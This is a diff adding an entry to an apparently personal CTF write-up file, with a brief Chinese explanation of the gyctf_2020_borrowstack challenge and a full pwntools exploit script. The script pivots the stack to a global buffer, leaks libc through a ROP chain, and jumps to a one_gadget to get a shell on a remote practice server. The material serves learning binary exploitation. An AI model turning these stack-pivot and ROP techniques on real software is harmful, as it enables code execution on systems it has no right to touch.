@@ -765,3 +765,52 @@ e = ELF(filename)
 p.sendline(b'b'*(0x14+4)+p32(e.sym['printFlag']))
 p.interactive()
 ```
+### gyctf_2020_borrowstack
+本身只有两次写入机会，第一次写入栈的缓冲区，第二次写入一个全局变量；但缓冲区溢出的部分只能覆盖到返回地址，所以需要同时覆盖rbp并加上leave ret指令，把栈转移到全局变量所在的内存。同时要注意抬高转移的目的地址，防止写入到不该写的地方引起segfault
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './gyctf_2020_borrowstack'
+#p = process(filename)
+p = remote('node3.buuoj.cn', 28284)
+e = ELF(filename)
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+libc = ELF('/home/ubuntu/glibc-lib/ubuntu_16_x86_64_libc-2.23.so')
+#gadgets = [0x4f432, 0x10a41c]
+gadgets = [0x4526a, 0xf02a4, 0xf1147, 0x45216]
+
+offset = 0x40
+fake_rbp = e.sym['bank'] + offset
+
+leave_ret = 0x0000000000400699
+pop_rdi_ret = 0x0000000000400703
+pop_r12_15_ret = 0x004006fc  # pop r12, r13, r14, r15, ret
+call_r12 = 0x004006d6 # zero rbx; rdx<-r13, rsi<-r14, edi<-r15d
+ret = 0x00000000004004c9
+pop_r15_ret = 0x0000000000400702
+
+p.sendafter(b'want', b'a'*0x60+p64(fake_rbp)+p64(leave_ret))
+payload = b'b' * offset
+payload += p64(fake_rbp+0x30) 
+payload += p64(pop_rdi_ret) + p64(e.got['read']) + p64(e.plt['puts'])
+
+write_addr = e.sym['bank'] + len(payload) + 6*8
+call_addr = write_addr + 8
+payload += p64(pop_r12_15_ret) + p64(call_addr) + p64(8) + p64(write_addr) + p64(0) + p64(call_r12)
+payload += p64(0) + p64(e.plt['read']) + p64(pop_r15_ret)
+
+log.info(f'len={hex(len(payload))}')
+
+p.sendafter(b'now!', payload)
+p.recvuntil(b'\n')
+
+leaked_func = u64(p.recv(6).ljust(8, b'\x00'))
+libc_base = leaked_func - libc.sym['read']
+gadget = gadgets[0] + libc_base
+log.success(f'read={hex(leaked_func)}; base={hex(libc_base)}; gadget={hex(gadget)}')
+
+p.send(p64(gadget))
+p.interactive()
+```
